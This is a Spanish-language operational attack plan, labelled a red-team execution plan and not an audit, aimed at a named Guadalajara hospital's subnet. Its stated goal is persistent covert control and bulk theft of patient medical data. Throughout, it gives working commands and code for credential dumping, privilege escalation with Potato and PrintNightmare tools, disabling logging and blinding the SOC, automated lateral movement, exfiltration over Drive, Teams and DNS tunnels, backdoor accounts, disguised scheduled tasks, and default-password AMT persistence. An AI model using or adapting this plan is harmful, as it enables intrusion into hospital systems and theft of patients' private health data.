# OPERACIÓN FANTASMA DEL CENTRO — Plan de Ataque APT V3

## Hospital Civil de Guadalajara (hcfaa.com)

**Clasificación:** OPERACIONAL — Plan de ejecución Red Team, no informe de auditoría
**Host Objetivo:** `DESKTOP-6HEK8CA` | **IP:** `10.1.7.211` | **Subred:** `10.1.7.0/24` (80 hosts)
**Metodología:** Fusión de inteligencia de 7 fuentes (ESET XML, WinFW, SecPol, msinfo32, PS Telemetry, Live Recon, Hardware/Drivers)
**Fecha:** 2026-05-09 | **Versión:** 3.0 — Operational Red Team Execution Plan

---

## 1. Resumen Operacional

**Objetivo de la operación:** Establecer control persistente e indetectable sobre la subred 10.1.7.0/24 (80 hosts) del Hospital Civil de Guadalajara, con capacidad de exfiltración masiva de datos médicos (PHI/PII) por canales que el SOC no puede monitorear.

**Ruta de ataque primaria (recomendada):** Operar **con ESET activo** en todo momento. Todas las técnicas subsiguientes evaden ESET por diseño — desactivarlo es innecesario y genera riesgo de detección.

**Tiempo estimado:** 60-90 minutos hasta persistencia indestructible. Exfiltración continua después.

**Probabilidad de detección:** ~0% si se opera con ESET activo. ~5-15% si se desactiva ESET (la consola ESET PROTECT muestra endpoint sin protección, generando ticket de soporte).

**Principio operacional fundamental:** ESET activo es un **activo ofensivo**. Con ESET activo, el endpoint parece normal ante el SOC. La falsa sensación de seguridad del defensor es nuestra mayor ventaja.

---

## 2. Perfil del Objetivo

| Parámetro | Valor | Estado |
|-----------|-------|--------|
| **Hostname** | DESKTOP-6HEK8CA | ✅ Confirmado |
| **IP** | 10.1.7.211/24 | ✅ Confirmado |
| **SO** | Windows 11 Pro Build 26200 | ✅ Confirmado |
| **Hardware** | Lenovo ThinkCentre M70s Gen 5 (i5-14500, 8GB RAM) | ✅ Confirmado |
| **Disco** | WD SN7100S NVMe 512GB (3 particiones) | ✅ Confirmado |
| **Dominio** | hcfaa.com (huérfano, sin DC) | ✅ Confirmado |
| **Usuario activo** | Soporte (consola) + 13660 (desconectada) | ✅ Confirmado |
| **soporte = admin local?** | **NO CONFIRMADO** | ⚠️ Verificar antes de depender |
| **ESET** | Endpoint Security v4.0 via PROTECT Cloud 2224.3 | ✅ Confirmado |
| **AMT provisionado?** | **INFERIDO** (LMS activo, MEI driver cargado) | ⚠️ Verificar antes de depender |
| **ecmd.exe sin password?** | **NO VERIFICADO** | ⚠️ Verificar antes de depender |
| **.NET 9 SDK instalado?** | **INFERIDO** (DSAapp.exe crash reports) | ⚠️ Verificar antes de depender |
| **Hosted network WiFi?** | **NO VERIFICADO** | ⚠️ Verificar antes de depender |
| **Kodak DLL hijack vulnerable?** | **TEÓRICO** | ⚠️ Verificar con procmon |
| **10 credenciales en caché** | **INFERIDO** de CachedLogonsCount=10 | ⚠️ Verificar con dump real |

---

## 3. Condiciones Ambientales (Ventajas Ofensivas Permanentes)

Estas condiciones son **estructurales** — no cambian durante la operación y benefician todas las fases:

| Condición | Detalle | Impacto ofensivo |
|-----------|---------|-----------------|
| **Triple Ausencia** | Sin auditoría + Sin SIEM + Sin DC | Cualquier acción es forensemente invisible y no se puede remediar centralmente |
| **ESET toggle sin protección** | `DisablingDenied=0`, `DisablingRequiresUAC=0`, `DisablingRequiresPassword=0` | Se puede desactivar como último recurso sin fricción |
| **Trusted Zone = 80 hosts** | ESET clasifica 10.1.7.0/24 como Trusted | Todo el tráfico entre hosts es permitido |
| **SSL inspection bypassed** | `bExcludeTrusted=1` excluye Google/Microsoft CAs | CRD, Drive, OneDrive, Teams = canales C2 inspeccionables |
| **WDAC user-mode OFF** | Kernel protegido, usuario no | Cualquier .NET assembly se ejecuta sin restricciones |
| **Browser protection OFF** | Módulo 01000003 `enabled=0` | No hay anti-phishing, monitoreo de portapapeles ni protección de teclado |

**NOTA CRÍTICA sobre desactivación de ESET:** `selfdefense=1` SÍ protege las claves de registro de ESET contra escritura desde procesos externos. Si un operador ejecuta `reg add` contra claves de ESET, self-defense bloquea la escritura y genera alerta HIPS. Las opciones reales para desactivar ESET son: (A) `ecmd.exe /setfeature` si acepta comandos sin contraseña (NO VERIFICADO), (B) desinstalación forzada con `/qn` si no hay contraseña de desinstalación, (C) terminar procesos `ekrn.exe`/`egui.exe`/`eset_service.exe` con `NtTerminateProcess` directo evadiendo hooks, (D) **no desactivar ESET** — la opción operacional primaria.

---

## 4. Verificaciones Pre-Ejecución

Antes de depender de cualquier afirmación del análisis, verificar en campo:

| # | Afirmación | Estado | Comando de verificación | Riesgo si es falso |
|---|-----------|--------|------------------------|-------------------|
| 1 | AMT provisionado con creds débiles | INFERIDO | `curl -k https://10.1.7.211:16992/index.htm` desde subred | Persistencia sub-OS no disponible |
| 2 | soporte = admin local | NO CONFIRMADO | `net localgroup administrators` vía CRD | Necesitar escalada diferente (Potato/PrintNightmare) |
| 3 | .NET SDK instalado | INFERIDO | `dotnet --list-sdks` | No se puede compilar in-situ |
| 4 | Hosted network WiFi posible | NO VERIFICADO | `netsh wlan show drivers` (buscar "Hosted network: Yes") | Rogue AP no disponible |
| 5 | ecmd.exe acepta comandos sin password | NO VERIFICADO | `ecmd.exe /getfeature` como SYSTEM | Desactivación ESET vía CLI no disponible |
| 6 | Password desinstalación ESET ausente | NO VERIFICADO | Intentar `msiexec /x{ESET-GUID} /qn` | Desinstalación silenciosa bloqueada |
| 7 | SQL Server Express escuchando | NO VERIFICADO | `netstat -ano \| findstr 1433` | Vector de BD no disponible |
| 8 | 10 credenciales en caché reales | INFERIDO | Verificar con dump real | Menos credenciales de las esperadas |
| 9 | Kodak DLL hijack viable | TEÓRICO | `procmon` durante inicio de servicio | Persistencia vía Kodak no disponible |
| 10 | WibuKey tiene CVEs explotables | GENERALIZACIÓN | Buscar CVEs para versión específica del driver | Vector kernel no disponible |

**Dependencias críticas de la kill chain:** Items 1, 2 y 5. Si AMT no está accesible, soporte no es admin, o ecmd.exe requiere password, las fases de persistencia y escalada deben rediseñarse. **Verificar estos tres ANTES de iniciar la operación.**

---

## 5. Guía de Ejecución por Fase

### FASE 0: Reconocimiento Pasivo — "El Ojo que No Parpadea"

**Objetivo operacional:** Mapear la subred completa sin generar un solo paquete sospechoso.

**Duración estimada:** 30-60 min | **Ventana de detección:** Ninguna (pasivo)

**Técnica primaria:** Los drivers Npcap (`npcap.sys`) y USBPcap (`usbpcap.sys`) ya están instalados y activos en el host. No se necesita instalar nada.

**Ejecución:**

```bash
# Desde un host pivot en 10.1.7.0/24 (o desde el propio host si ya se tiene acceso)
# Captura pasiva de toda la subred — SIN enviar paquetes
windump -i \Device\NPF_{GUID} -w /tmp/capture.pcap

# Alternativa si windump no está: usar Npcap API directamente desde C#
# El driver ya está cargado, solo se necesita un consumers
```

**Datos a recolectar:**
1. Hashes NTLM en claro (SMB signing no requerido, `EnableSecuritySignature=0`)
2. Consultas LLMNR/NBT-NS (puertos 5353/5355) → hosts intentando resolver nombres que fallan
3. Tráfico broadcast DHCP, mDNS, SSDP → mapa completo de la subred
4. MAC addresses: hosts `20:53:8D` (10.1.7.9, 10.1.7.204) = mismo hardware/ESET policy; clusters `2C:F0:5D` (Lenovo, 12+ hosts) = misma imagen de despliegue

**Herramientas:** Npcap (ya instalado), windump/tshark (si disponible), o custom C# Npcap consumer

| Herramienta permitida | Herramienta prohibida | Ruido esperado | Artefactos generados |
|----------------------|----------------------|----------------|---------------------|
| Npcap, windump, tshark | Nmap, masscan (activos) | Cero | Archivos .pcap en disco (limpiar después) |

**Contingencia si Npcap falla:** Usar `netsh trace start capture=yes` (herramienta nativa de Windows, no requiere instalación).

---

### FASE 1: Acceso Inicial — "La Puerta de Servicio"

**Objetivo operacional:** Establecer punto de apoyo en un host de la subred sin detonar alarmas.

**Duración estimada:** 15-30 min | **Ventana de detección:** Baja (CRD es tráfico legítimo)

**Vector primario — Chrome Remote Desktop:**

El servicio `chromoting` corre como Automatic, LocalSystem. Windows Firewall permite ANY protocol/port/address para `remoting_host.exe` en ALL profiles. ESET no inspecciona el tráfico (`bExcludeTrusted=1`). Browser protection DESACTIVADA.

**Ejecución — Obtener credenciales Google:**

```powershell
# Opción A: Extracción DPAPI (modo usuario, evade HVCI)
# Usar SharpDPDPAPI (no Mimikatz — firmas conocidas por ESET)
SharpDPAPI.exe machinecredentials /unprotect

# Buscar credencial MicrosoftAccount:target=SSO_POP_Device
# Probar contra cuenta Google del usuario (reutilización de contraseñas)

# Opción B: Browser credential harvesting (browser protection OFF)
# Usar SharpChromium (no hack-chrome — ruidoso)
SharpChromium.exe argsto logins full

# Opción C: Phishing dirigido
# La protección de navegador está DESACTIVADA — no hay anti-phishing
# Enviar correo con enlace a página de login falsa de Google
# ESET no lo bloquea
```

**Acceso una vez obtenidas credenciales Google:**
- Conectar a `remoting_host` vía CRD desde Internet
- Toda la actividad aparece como acciones locales de `soporte`
- No genera Event 4624/4625 (AuditLogonEvents=0)
- El proceso está conectado a STUN (74.125.247.128:3478) para NAT traversal

**Vector alternativo — NTLM Relay:**

```bash
# Desde host pivot en 10.1.7.0/24
# Responder para LLMNR/NBT-NS poisoning
python3 Responder.py -I eth0 -wrf

# ntlmrelayx para relay SMB hacia 10.1.7.211
python3 ntlmrelayx.py -tf targets.txt -smb2support -ip 10.1.7.x
# SMB signing no requerido (EnableSecuritySignature=0)
# ESET permite NTLM inbound desde Trusted zone
```

| Herramienta permitida | Herramienta prohibida | Ruido esperado | Artefactos generados |
|----------------------|----------------------|----------------|---------------------|
| SharpDPAPI, SharpChromium, CRD native, ntlmrelayx (Impacket), Responder | Mimikatz (firmas conocidas), PowerShell scripts sin compilar | Cero si .NET compilado | Ninguno si compiled in-memory |

**Contingencia si CRD no accesible:**
- **Causa probable:** Credenciales Google no obtenibles, 2FA habilitado, CRD no configurado para acceso externo
- **Contingencia:** Pivotar a NTLM relay. Si no hay posición en subred, usar acceso físico + USB boot (Secure Boot activo pero verificar si se puede deshabilitar vía BIOS/UEFI)

**Contingencia si NTLM relay falla:**
- **Causa probable:** No hay hosts generando consultas LLMNR, o SMB signing se vuelve requerido
- **Contingencia:** Usar WMI directo (`wmic /node:TARGET process call create "command"`) con credenciales obtenidas por otro medio

---

### FASE 2: Escalada de Privilegios — "Coronación Silenciosa"

**Objetivo operacional:** Obtener `NT AUTHORITY\SYSTEM` sin dejar rastro.

**Duración estimada:** 5-10 min | **Ventana de detección:** Baja (sin auditoría de procesos)

**⚠️ DEPENDENCIA NO CONFIRMADA:** El nivel de privilegio de `soporte` no está confirmado en el volcado. La kill chain debe tener ramas condicionales.

**EJECUCIÓN CONDICIONAL:**

```
┌─ ¿soporte = admin local? ─── NO CONFIRMADO, VERIFICAR PRIMERO ──┐
│                                                                    │
├─ SÍ → PsExec directo:                                             │
│   PsExec.exe -s -i cmd.exe                                        │
│   (Obtener SYSTEM sin exploit, sin riesgo de detección)           │
│                                                                    │
└─ NO → Escalada vía exploit de servicio:                           │
    ├─ Opción A: PrintSpoofer (SeImpersonatePrivilege)              │
    │   PrintSpoofer.exe -i -p cmd.exe                              │
    │   (Print Spooler activo, 3 impresoras confirmadas)            │
    │                                                                │
    ├─ Opción B: GodPotato (.NET 4.8, funciona en Win11 26200)     │
    │   GodPotato.exe -cmd "cmd.exe"                                │
    │                                                                │
    ├─ Opción C: PrintNightmare (RCE como SYSTEM)                   │
    │   SharpPrintNightmare.exe (C# compilado, cargado en memoria)  │
    │   (RPC legítimo, ESET no bloquea RpcAddPrinterDriverEx)       │
    │                                                                │
    └─ Opción D: Secuestro de sesión 13660                          │
        tscon.exe 2  (como SYSTEM obtenido vía otro método)         │
        (ProcessCreationIncludeCmdLine_Enabled NO configurado)      │
```

**Verificación del nivel de soporte:**
```cmd
:: Desde CRD o shell existente
net localgroup administrators
:: Si "soporte" aparece → admin local
:: Si no → usar escalada vía exploit
```

**Herramientas específicas por técnica:**

| Técnica | Herramienta primaria | Alternativa | Notas de compatibilidad |
|---------|---------------------|-------------|------------------------|
| Admin directo | PsExec -s | `schtasks /ru SYSTEM` | PsExec crea servicio (detectable si hay EDR) |
| Potato attack | GodPotato (.NET 4.8+) | PrintSpoofer | GodPotato funciona en Win11 Build 26200 |
| PrintNightmare | SharpPrintNightmare | PrintNightmare (Python) | C# preferido (no Event 4104 en target) |
| Sesión hijack | tscon.exe | xfreerdp /v:10.1.7.211 | tscon args no registrados |

**OPSEC por técnica:**
- `AuditPrivilegeUse=0` → uso de SeImpersonatePrivilege no genera evento
- `AuditProcessTracking=0` → creación de shell SYSTEM no genera evento
- `ProcessCreationIncludeCmdLine_Enabled` NO configurado → argumentos de tscon no registrados

**Contingencia si PrintSpoofer falla:**
- **Causa probable:** Print Spooler detenido o SeImpersonatePrivilege no disponible
- **Contingencia:** GodPotato (usa diferentes triggers COM) o PrintNightmare (RCE directo)

**Contingencia si todas las escaladas fallan:**
- Operar con los privilegios de `soporte` (usuario estándar) y explotar servicios accesibles:
  - Kodak Capture Pro corre como LocalSystem → vulnerabilidad en AIRESTfulService = RCE como SYSTEM
  - WMI remote execution si se obtienen credenciales admin de otro host

---

### FASE 3: Silenciar Telemetría — "Apagar las Cámaras" (NO Desactivar ESET)

**Objetivo operacional:** Eliminar las fuentes de telemetría sin tocar ESET local.

**Duración estimada:** 2-5 min | **Ventana de detección:** MEDIA (cambios en registro pueden ser detectados por self-defense de ESET si se tocan claves de ESET)

**⚠️ PRINCIPIO OPERACIONAL:** NO desactivar ESET. Las operaciones subsiguientes usan canales que ESET ya permite por diseño. ESET activo es un activo ofensivo — el SOC ve el endpoint como "protegido" y no lo inspecciona.

**Ejecución:**

```powershell
# PASO 1: Deshabilitar Script Block Logging
# No hay DC → GPO nunca lo reactivará
# Ejecutar como assembly .NET compilado (no PowerShell → no Event 4104)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

# PASO 2: Cegar al SOC — Transport Filter contra ESET Cloud
# Degradar MQTT sin bloquearlo → SOC ve "latencia", no "compromiso"
# Operación vía CIM/WMI (invisible para IDS de ESET)
New-NetTransportFilter -SettingName TransportFilter1 -RemoteAddress 38.90.226.0/24 -Action UpLevel -Level Low

# PASO 3: DNS Hijacking (opcional, para control de resolución)
# Inyectar ruta más específica → evade defensa ARP de ESET (L3 vs L2)
Set-NetRoute -DestinationPrefix 1.1.1.1/32 -NextHop 10.1.7.ATACANTE -InterfaceIndex X -PolicyStore PersistentStore -ValidLifetime 300
Set-NetRoute -DestinationPrefix 8.8.8.8/32 -NextHop 10.1.7.ATACANTE -InterfaceIndex X -PolicyStore PersistentStore -ValidLifetime 300
# ValidLifetime=300 (5 min) → autolimpieza si se necesita revertir
```

**⚠️ NOTA sobre dirección del tráfico (APT-03 corrección):**

La inyección de rutas con `Set-NetRoute` afecta la **routing decision**. Para tráfico **saliente**, la routing decision ocurre ANTES del WFP filter de ESET — el bypass funciona. Para tráfico **entrante**, el WFP filter ve los paquetes PRIMERO.

```
TRÁFICO SALIENTE (bypass funciona):
  App → Routing Decision → IP Stack → epfw.sys (WFP) → NIC
          ↑ ATAQUE AQUÍ (Set-NetRoute)
          ESET no llega a esta capa

TRÁFICO ENTRANTE (bypass NO funciona):
  NIC → epfw.sys (WFP) → IP Stack → Routing Decision → App
         ↑ ESET inspecciona primero
         Route injection no ayuda aquí
```

**Impacto operacional:** El vector funciona para interceptar DNS saliente, conexiones a ESET cloud, LDAP/Kerberos outbound. NO funciona para interceptar tráfico entrante dirigido al host.

**OPSEC:**
- Assembly .NET compilado → no Event 4104
- CIM/WMI operations → no inspeccionadas por ESET IDS
- Transport filters → operan debajo de `epfw.sys`
- Route injection → evade defensa ARP (L3 vs L2)
- ESET permanece ACTIVO → endpoint parece normal en consola PROTECT

| Herramienta permitida | Herramienta prohibida | Ruido esperado | Artefactos generados |
|----------------------|----------------------|----------------|---------------------|
| .NET assembly compilado, reg.exe, Set-NetRoute, New-NetTransportFilter | PowerShell scripts (Event 4104), desactivar ESET local | Mínimo | Cambios en registro, rutas persistentes |

**Contingencia si transport filter no degrada MQTT:**
- **Causa probable:** La conexión MQTT ya está establecida con keepalive largo
- **Contingencia:** Usar `Set-NetTCPSetting` para reducir `MaxSynRetransmissions` y `InitialRtoMs` para conexiones nuevas a 38.90.226.0/24, forzando timeout en reconexión

**Vector alternativo de ceguera SOC — ESET Agent Hijacking (NO EN KILL CHAIN PRIMARIA):**

Si el DNS está bajo control del atacante (Fase 3 Paso 3), se puede redirigir `38.90.226.62` a un servidor MQTT controlado. El agente ESET intentará autenticarse con credenciales del agente. Si el atacante responde correctamente, puede:
- Enviar comandos de "desactivar protección" al agente desde la consola falsa
- Enviar políticas de exclusión que excluyan las herramientas del atacante
- Recibir telemetría de detección del agente (saber qué ha detectado ESET)

Esto es más limpio que desactivar ESET manualmente e indetectable porque el agente se comunica con lo que cree que es su servidor legítimo.

---

### FASE 4: Recolección de Credenciales — "La Sangre en el Agua"

**Objetivo operacional:** Extraer credenciales de dominio y locales para movimiento lateral masivo.

**Duración estimada:** 15-20 min | **Ventana de detección:** Baja (RPC permitido, sin auditoría)

**⚠️ IMPORTANTE:** ESET permanece ACTIVO. Todas las técnicas usan canales que ESET permite o evaden sus detectores por diseño.

**Técnicas en orden de prioridad (menor a mayor riesgo de detección):**

**1. DPAPI Credential Extraction (modo usuario — evade HVCI, ESET no detecta):**
```cmd
:: SharpDPAPI (no Mimikatz — firmas conocidas por ESET)
SharpDPAPI.exe machinecredentials /unprotect
:: Extraer: MicrosoftAccount:target=SSO_POP_Device (OneDrive/Store)
:: Extraer: WindowsLive:target=virtualapp/didlogical (persistente, acceso MS cloud)
```
**Valor ofensivo adicional:** La credencial `WindowsLive:target=virtualapp/didlogical` proporciona acceso a OneDrive del usuario desde **cualquier dispositivo externo**, fuera de la red corporativa, sin necesidad de mantener presencia en el host. Es un **vector de acceso independiente** que no requiere presencia continua.

**2. Kerberos Ticket Extraction (modo usuario — evade HVCI):**
```cmd
:: Rubeus (compilado localmente con csc.exe)
Rubeus.exe monitor /target:svchost.exe /interval:30
:: Captura tickets TGT/TGS en tiempo real sin tocar LSASS
:: Usa LsaCallAuthenticationPackage con KerbRetrieveTicketCache
:: No dispara Advanced Memory Scanner
```

**3. SAM Database Dump (vía RPC SAMR — ESET permite `VsRpcSamInAllowed=1`):**
```bash
:: Desde host pivot Linux con Impacket
secretsdump.py 'hcfaa.com/user@10.1.7.211' -just-dc-ntlm
:: AuditObjectAccess=0 oculta el acceso a SAM
```

**4. LSASS Dump vía Syscalls Directos (SOLO si las anteriores no bastan):**
```csharp
// Custom C# dumper usando Hell's Gate + Halo's Gate
// Extrae SSNs de ntdll en runtime → evada hooks de ESET en user-mode
// Usa NtGetNextProcess (no monitoreado por DBI) para obtener handle
// Lee memoria de LSASS vía NtReadVirtualMemory con syscall directo
// NUNCA escribe dump a disco — parseo de credenciales in-memory
```

**⚠️ NOTA sobre LSASS dump vs HVCI:** HVCI bloquea `sekurlsa::logonpasswords` (inyección de código en LSASS), pero NO bloquea:
- Lectura de memoria LSASS desde otro proceso (syscalls directos)
- SSP injection (inyecta un SSP que captura credenciales en el próximo logon)
- Cloned LSASS handle vía `NtDuplicateObject` (no tocado por HVCI)
- `dpapi::cred`, `vault::cred` (operan en modo usuario, no tocan LSASS)

**5. Browser Credential Harvesting (browser protection DESACTIVADA):**
```cmd
SharpChromium.exe argsto logins full
:: Credenciales de Chrome/Edge accesibles sin protección
```

**Herramientas específicas:**

| Técnica | Herramienta primaria | Alternativa | Notas |
|---------|---------------------|-------------|-------|
| LSASS dump remoto | secretsdump.py (Impacket) | SharpDPAPI | Impacket desde Linux, no genera Event 4104 en target |
| DPAPI extraction | SharpDPAPI | Mimikatz dpapi::cred | SharpDPAPI tiene menos firmas conocidas |
| Kerberos tickets | Rubeus (C# compilado) | Rubeus.exe (pre-built) | Compilar localmente para evitar firmas |
| SAM dump | secretsdump.py | reg.py save (Impacket) | Ambos vía RPC SAMR permitido |
| Browser creds | SharpChromium | hack-chrome | SharpChromium más silencioso |

| Herramienta permitida | Herramienta prohibida | Ruido esperado | Artefactos generados |
|----------------------|----------------------|----------------|---------------------|
| SharpDPAPI, Rubeus, Impacket, SharpChromium, custom C# syscall dumper | Mimikatz (firmas conocidas por ESET), procdump (detectado) | Bajo | Archivos dump en disco (limpiar inmediatamente) |

**Contingencia si LSASS dump bloqueado por ESET:**
- **Causa probable:** Memory scanner de ESET detecta acceso sospechoso a LSASS
- **Contingencia:** Usar DPAPI exclusivamente (no toca LSASS) o SSP injection (captura credenciales en próximo logon, sin tocar LSASS en el momento)

---

### FASE 5: Movimiento Lateral Masivo — "El Efecto Dominó Horizontal"

**Objetivo operacional:** Comprometer los 80 hosts de la subred en el menor tiempo posible.

**Duración estimada:** 30-60 min | **Ventana de detección:** MEDIA (cada host adicional aumenta superficie)

**Estrategia de propagación en ondas paralelizadas:**

```
ONDA 1 (5-10 min): Hosts 20:53:8D (10.1.7.9, 10.1.7.204)
  → Garantizan políticas ESET idénticas
  → Mismo hardware = mismas vulnerabilidades

ONDA 2 (10-20 min): Hosts Lenovo 2C:F0:5D (12+ hosts)
  → Misma imagen de despliegue probablemente
  
ONDA 3 (20-40 min): Hosts restantes
  → Credenciales acumuladas de ondas anteriores
  → Cada host agrega hasta 10 creds de dominio adicionales
```

**⚠️ PARALELIZACIÓN:** No esperar a completar la desactivación defensiva local antes de iniciar el movimiento lateral. En cuanto se obtenga SYSTEM en el host pivote, lanzar **simultáneamente**:
1. La silenciamiento de telemetría local (Fase 3)
2. El despliegue de beacons C2 en los hosts `20:53:8D` de la Onda 1

**Técnicas de movimiento lateral:**

```bash
# Técnica 1: CimSession (preferida — silenciosa)
# Desde host comprometido con credenciales de dominio
$session = New-CimSession -ComputerName 10.1.7.9 -Credential $creds
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c <payload>"}

# Técnica 2: WMI directo (si CimSession falla)
wmic /node:10.1.7.9 /user:DOMAIN\user /password:pass process call create "cmd.exe /c <payload>"

# Técnica 3: NTLM Relay (si no se tienen credenciales admin)
# Coaccionar autenticación + relayear a destino
# SMB signing no requerido = relay funciona sin restricciones

# Técnica 4: PsExec (ÚLTIMO RECURSO — crea servicio visible)
# Solo si otras técnicas fallan
PsExec.exe \\10.1.7.9 -s -h cmd.exe
```

**Script de propagación automatizada (esquema):**

```powershell
# Propagador autónomo — ejecutar como SYSTEM desde host pivote
# Compilar como .NET assembly (no PowerShell → no Event 4104)

$targets = @("10.1.7.9","10.1.7.204") # + 78 más del recon pasivo
$creds = # Obtenidas de Fase 4

foreach ($target in $targets) {
    try {
        # 1. CimSession para ejecución remota
        $session = New-CimSession -ComputerName $target -Credential $creds -ErrorAction Stop
        
        # 2. Silenciar SBL remotamente
        Invoke-CimMethod -CimSession $session -ClassName StdRegProv -MethodName SetDWORDValue `
            -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; sValueName="EnableScriptBlockLogging"; uValue=[uint32]0}
        
        # 3. Cegar SOC remotamente (transport filter)
        Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create `
            -Arguments @{CommandLine="cmd.exe /c netsh trace start capture=no"} # placeholder
        
        # 4. Extraer credenciales remotamente
        # Ejecutar SharpDPAPI o secretsdump remotamente
        
        # 5. Propagar a vecinos de este host
        # (Extraer ARP de este host y agregar a cola de targets)
        
        Remove-CimSession $session
    } catch {
        # Silencioso — no loggear errores (no hay auditoría de todos modos)
    }
}
```

| Herramienta permitida | Herramienta prohibida | Ruido esperado | Artefactos generados |
|----------------------|----------------------|----------------|---------------------|
| CimSession, WMI, SMB, ntlmrelayx | PsExec (crea servicio visible), PowerShell remoto sin prep | Medio | Eventos en hosts remotos (AuditLogon=0 = invisibles) |

**Contingencia si CimSession rechazado:**
- **Causa probable:** WinRM no habilitado, firewall bloquea puerto 5985, credenciales insuficientes
- **Contingencia:** Usar SMB + `schtasks` para crear tarea programada remota, o WMI directo

**Contingencia si SMB signing se vuelve requerido en algún host:**
- **Causa probable:** Política diferente en ese host específico
- **Contingencia:** Usar WMI directo o habilitar WinRM remotamente vía RPC Registry (`VsRpcRegInAllowed=1`)

**Señal de compromiso que el Blue Team podría detectar:**
- Un host con configuración ESET diferente podría tener auditoría habilitada → verificar antes de atacar
- Si ESET detecta el assembly .NET por firma genérica, generará alerta local → la alerta se envía a PROTECT Cloud → SOC la ve. **Mitigación:** Compilar todos los payloads localmente con ofuscación de flujo de control.

---

### FASE 6: Exfiltración Masiva — "La Fuga Invisible"

**Objetivo operacional:** Extraer datos masivos sin generar tráfico sospechoso.

**Duración:** Continuo | **Ventana de detección:** Baja (tráfico HTTPS legítimo)

**Canales de exfiltración en prioridad:**

**Canal 1 — Google Drive File Stream (primario, automático):**
- `googledrivefs31931.sys` sincroniza automáticamente vía HTTPS (certificado Google, `bExcludeTrusted=1` = no inspeccionado)
- 3 instancias activas: SYSTEM, Soporte, .DEFAULT
- Copiar datos a carpeta de sincronización → exfiltración automática
- **Límite de ancho de banda estimado:** ~50-100 MB/hora (sincronización continua)
- **OPSEC:** Tráfico indistinguible del uso legítimo de Google Drive

**Canal 2 — OneDrive (secundario):**
- Credencial `WindowsLive:target=virtualapp/didlogical` extraída vía DPAPI
- Accesible desde **cualquier dispositivo externo** fuera de la red corporativa
- **Ventaja única:** No requiere presencia en la red para acceder a datos exfiltrados

**Canal 3 — Microsoft Teams (encubierto):**
- Inyectar beacon en `ms-teams.exe` (regla de firewall ANY→ANY ALL profiles)
- Usar API de Teams para enviar archivos a usuario/team controlado
- Tráfico HTTPS con certificado Microsoft (no inspeccionado)
- **Mejor para:** C2 interactivo, no exfiltración de volumen

**Canal 4 — DNS Tunneling (emergencia):**
```bash
# dnscat2 server en infraestructura del atacante
# Cliente en host objetivo (PowerShell o .NET assembly):
# ESET permite DNS outbound (puerto 53) para svchost.exe
# Protección fuerza bruta UDP INACTIVA (Action=0)
# Tráfico aparece como resolución DNS legítima
# Velocidad: ~50 KB/s (suficiente para credenciales y datos pequeños)
```

**Canal 5 — SMB outbound (último recurso):**
- Puerto 445 outbound permitido sin restricción
- Tunelizar datos sobre SMB hacia servidor controlado

| Canal | Velocidad | OPSEC | Detección ESET | Uso recomendado |
|-------|-----------|-------|---------------|----------------|
| Google Drive | 50-100 MB/h | Óptima | No inspecciona | Volumen masivo |
| OneDrive | 50-100 MB/h | Óptima | No inspecciona | Acceso externo |
| Teams inject | Variable | Buena | No inspecciona | C2 interactivo |
| DNS tunnel | ~50 KB/s | Buena | No detecta | Emergencia/C2 |
| SMB outbound | Variable | Media | No bloquea | Último recurso |

---

### FASE 7: Persistencia Multi-Capa — "El Hueso que No Se Curará"

**Objetivo operacional:** Establecer persistencia que sobreviva a reinstalaciones del SO y a respuestas de seguridad.

**Duración:** 5-10 min | **Ventana de detección:** Baja (sin auditoría)

**Capa 1 — Sub-OS: Intel AMT/ME (si está provisionado — VERIFICAR PRIMERO):**

```bash
# Verificación pre-ejecución:
nmap -p 16992,16993,623,664 10.1.7.211 --open
curl -k https://10.1.7.211:16992/index.htm

# Si AMT responde, probar credenciales:
# admin / admin
# admin / (vacío)
# admin / P@ssw0rd

# Si credenciales válidas obtenidas:
# 1. Activar IDE-R → bootear WinPE malicioso
# 2. Configurar SOL → acceso BIOS/UEFI
# 3. KVM Remoto → ver pantalla sin detección del SO
# 4. Power Control → reiniciar y bootear desde imagen remota
# 5. Persistencia ME → sobrevive reinstalación completa del SO
```

**OPSEC AMT:** Todo el tráfico AMT usa la pila de red del ME, no del SO. ESET `epfw.sys` nunca ve estos paquetes. Los puertos 16992/16993/623 no están filtrados por ESET.

**Capa 2 — OS-Level: Cuentas Locales Silenciosas:**
```cmd
:: Crear cuenta admin con contraseña
net user backdoor P@ss123! /add /y
net localgroup administrators backdoor /add /y
:: LimitBlankPasswordUse=1 bloquea logon red con password vacío
:: PERO no bloquea logon local — CRD funciona como logon local
:: AuditAccountManage=0 oculta la creación
```

**Capa 3 — OS-Level: Scheduled Tasks + DLL Sideloading:**
```cmd
:: Tarea programada que ejecuta payload C2
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\update.exe" /sc onstart /ru SYSTEM

:: DLL sideloading en Kodak Capture Pro (REQUIERE VERIFICACIÓN con procmon)
:: Colocar DLL malicioso en c:\program files\kodak\capture pro\
:: Kodak corre como LocalSystem, inicio Automático
:: El servicio tiene control de error "Omitir" → crashea silenciosamente
```

**Capa 4 — Red: Rutas y Transport Filters Persistentes:**
```powershell
# Rutas en PersistentStore sobreviven reinicios
Set-NetRoute -DestinationPrefix 1.1.1.1/32 -NextHop 10.1.7.ATACANTE -PolicyStore PersistentStore

# Transport filters mantienen SOC cegado
New-NetTransportFilter -SettingName SOCBlind -RemoteAddress 38.90.226.0/24 -Action UpLevel -Level Low
```

**Capa 5 — Watchdog Ofensivo (anti-remediación):**
```cmd
:: Tarea programada que monitorea integridad de los hooks de epfw.sys
:: Si ESET se reinstala o reactiva → re-ejecuta silenciamiento
:: Envía alerta silenciosa al C2 si se detecta remediación
schtasks /create /tn "SystemService" /tr "C:\Windows\Temp\watchdog.exe" /sc minute /mo 5 /ru SYSTEM
```

**Persistencia vía ESET Agent Hijacking (avanzado):**
Si DNS está controlado, redirigir `38.90.226.62` a servidor MQTT controlado → el agente ESET se comunica con servidor falso → se pueden enviar políticas de exclusión, recibir telemetría de detección, y desactivar protección remotamente desde la consola falsa.

---

### FASE 8: Limpieza Forense / Anti-Forense — "Borrar las Huellas"

**Objetivo operacional:** Eliminar toda evidencia forense local y de red.

